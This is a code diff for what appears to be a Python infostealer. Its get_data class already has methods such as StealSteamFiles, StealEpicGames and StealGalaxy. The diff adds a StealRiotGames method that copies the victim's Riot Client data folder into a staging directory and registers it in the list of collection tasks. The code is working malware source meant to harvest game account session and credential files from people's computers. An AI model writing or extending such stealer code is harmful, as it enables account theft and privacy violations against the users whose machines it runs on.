@@ -1939,7 +1939,31 @@ class get_data:
         except Exception as Error:
             logs_handler(f"[ERROR] - getting Steam files: {str(Error)}")
             return "null"
-        
+
+    async def StealRiotGames(self, directory_path) -> None:
+        try:
+            riotgame_path = os.path.join(self.localappdata, "Riot Games", "Riot Client", "Data")
+            destination_path = os.path.join(directory_path, "Games", "Riot Games")
+            saves = []
+
+            if not os.path.exists(riotgame_path):
+                return
+            else:
+                files = os.listdir(riotgame_path)
+
+                for file in files:
+                    save_path = os.path.join(riotgame_path, file)
+                    saves.append(save_path)
+
+            if saves:
+                try:
+                    if not os.path.isdir(destination_path):
+                        os.mkdir(destination_path)
+                    shutil.copytree(riotgame_path, os.path.join(destination_path, "Data"))
+                except Exception as Error:
+                    logs_handler(f"[ERROR] - copying Riot files to logs: {str(Error)}")
+        except Exception as Error:
+            logs_handler(f"Error getting Riot Game {str(Error)}")
             
     async def StealGalaxy(self, directory_path) -> None:
         try:
@@ -2171,6 +2195,7 @@ class get_data:
                 self.StealEpicGames(filePath),
                 self.StealGrowtopia(filePath),
                 self.StealSteamFiles(filePath),
+                self.StealRiotGames(filePath),
                 self.StealGalaxy(filePath),
                 self.StealRockstarGames(filePath),
                 self.StealElectronicArts(filePath),
